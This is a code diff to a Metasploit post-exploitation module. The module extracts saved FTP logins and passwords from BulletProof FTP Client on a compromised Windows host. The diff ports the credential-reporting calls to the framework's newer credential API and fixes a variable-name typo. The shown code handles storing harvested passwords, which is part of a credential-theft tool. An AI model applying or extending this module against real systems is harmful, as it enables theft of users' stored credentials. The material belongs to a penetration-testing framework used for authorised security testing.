@@ -182,12 +182,6 @@ class Metasploit3 < Msf::Post
 
   def report_findings(entries)
 
-    if session.db_record
-      source_id = session.db_record.id
-    else
-      source_id = nil
-    end
-
     entries.each{ |entry|
       @credentials << [
         entry[:site_name],
@@ -199,17 +193,32 @@ class Metasploit3 < Msf::Post
         entry[:local_dir]
       ]
 
-      report_auth_info(
-        :host  => entry[:site_address],
-        :port => entry[:port],
-        :proto => 'tcp',
-        :sname => 'ftp',
-        :user => entry[:login],
-        :pass => entry[:password],
-        :ptype => 'password',
-        :source_id => source_id,
-        :source_type => "exploit"
-      )
+      service_data = {
+        address: Rex::Socket.getaddress(entry[:site_address]),
+        port: entry[:port],
+        protocol: "tcp",
+        service_name: "ftp",
+        workspace_id: myworkspace_id
+      }
+
+      credential_data = {
+        origin_type: :session,
+        session_id: session_db_id,
+        post_reference_name: self.refname,
+        username: entry[:login],
+        private_data: entry[:password],
+        private_type: :password
+      }
+
+      credential_core = create_credential(credential_data.merge(service_data))
+
+      login_data = {
+        core: credential_core,
+        access_level: "User",
+        status: Metasploit::Model::Login::Status::UNTRIED
+      }
+
+      create_credential_login(login_data.merge(service_data))
     }
   end
 
@@ -234,8 +243,8 @@ class Metasploit3 < Msf::Post
     print_status("Searching BulletProof FTP Client installation directory...")
     # BulletProof FTP Client 2.6 uses the installation dir to store bookmarks files
     progfiles_env = session.sys.config.getenvs('ProgramFiles(X86)', 'ProgramFiles')
-    progfilesx86 = prog_files_env['ProgramFiles(X86)']
-    if not progfilesx86.empty? and progfilesx86 !~ /%ProgramFiles\(X86\)%/
+    progfilesx86 = progfiles_env['ProgramFiles(X86)']
+    if !progfilesx86.blank? && progfilesx86 !~ /%ProgramFiles\(X86\)%/
       program_files = progfilesx86 # x64
     else
       program_files = progfiles_env['ProgramFiles'] # x86
